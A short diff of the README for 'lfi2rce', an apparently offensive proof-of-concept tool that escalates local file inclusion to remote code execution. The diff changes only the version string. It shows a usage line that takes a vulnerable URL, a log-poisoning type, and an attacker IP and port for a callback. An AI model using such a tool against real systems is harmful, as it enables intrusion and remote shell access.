@@ -1,6 +1,6 @@
 Local File Inclusion To Remote Command Execution (PoC)  
 ```
-lfi2rce - Local File Inclusion To Remote Code Execution v1.1 by 0bfxgh0st*
+lfi2rce - Local File Inclusion To Remote Code Execution v1.0.2 by 0bfxgh0st*
 
 Usage python3 lfi2rce -u <lfi vulnerable url> -t <poison type> -r <attacker ip> -p <attacker port>
 
